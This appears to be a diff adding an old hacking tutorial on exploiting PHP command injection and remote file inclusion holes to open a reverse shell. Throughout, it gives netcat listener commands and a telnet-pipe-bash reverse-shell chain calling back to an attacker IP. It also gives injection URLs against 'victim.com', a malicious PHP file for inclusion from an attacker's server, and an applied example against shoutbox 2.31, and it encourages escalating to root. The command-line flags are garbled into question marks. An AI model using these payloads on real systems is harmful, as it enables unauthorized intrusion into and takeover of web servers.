@@ -1,0 +1,113 @@
+This article is not a guide how to find php holes, but an example of using those holes and gaining access to shells. 
+ 
+ 
+ 
+You will need: 
+ 
+- time 
+ 
+- a Server, which we are going to hack (with a php hole) 
+ 
+- netcat 
+ 
+- a brain;) 
+ 
+ 
+After installing netcat on your CPU, you'll need to set the port listining on ports 21 and 80. Why those? Simple, because they're opened on allmost e 
+tery firewall. 
+ 
+Start a new seesion and write: 
+ 
+ 
+ 
+nc ?l ?n ?v ?p 21 
+You'll get this answer: 
+ 
+Listening on [any] 21 
+ 
+ 
+ 
+Now start a second session and write: 
+ 
+ 
+ 
+Nc ?l ?n ?v ?p 80 
+ 
+The answer will be: 
+ 
+Listening on [any] 80 
+ 
+ 
+Netcat is now listening on port 21 and 80. 
+ 
+ 
+ 
+Now you'll have to send a shell on your listening ports, do it by using this command: 
+ 
+/bin/telnet your.ip 21 | /bin/bash | /bin/telnet your.ip 80 
+ 
+ 
+ 
+ 
+ 
+'your.ip' is the place, where you past your ip, /bin/bash is the shell you want to get, 21 and 80 are the ports listening on your netcat. 
+ 
+Of course telnet could be somewhere else, you can check this with the command: 
+ 
+whereis telnet 
+ 
+Ok, for sure you're wondering how to connect to the php hole, right? 
+ 
+ 
+ 
+There're two methods, depending on the php hole. The first: 
+ 
+ 
+http://victim.com/script/index.php?variable=/bin/telnet%20127.0.0.1%2021%20|%20/bin/bash%20|%20/bin/telnet%20127.0.0.1%2080 
+ 
+ 
+ 
+run such a link and on your terminal where the port 21 is listening you should see such a info: 
+ 
+Connecting from victim.com [21] 
+ 
+The second method is: 
+ 
+ 
+Make such a php file: 
+ 
+system("/bin/telnet 127.0.0.1 21 | /bin/bash | /bin/telnet 127.0.0.1 80"); 
+?> 
+and upload it on a server without php. 
+ 
+Now run: 
+ 
+ 
+http://victim.com/script/index.php?variable=http://ourserver.com/script.php 
+ 
+ 
+On your terminal where the port 21 is listening you should see the same info: 
+ 
+Connecting from victim.com [21] 
+ 
+ 
+ 
+Now you have a easy and fast access to the shell with apache rights. 
+ 
+Write your commands in the terminal where port 21 is listening. The results will come on the other terminal with port 80 listening. 
+ 
+Now you can easily gain root access if you want and I'm sure you will;) 
+ 
+Now an example: 
+ 
+A hole in shoutbox 2.31: 
+ 
+Make a file named shoutboxconf.php: 
+ 
+system("/bin/telnet your.ip 21 | /bin/bash | /bin/telnet your.ip 80"); 
+?> 
+upload it on a server and go to: 
+ 
+http://victim.com/shoutbox.php?conf=http://yourserver.com/shoutboxconf.php 
+ 
+That's it, hope you enjoyed this article;)
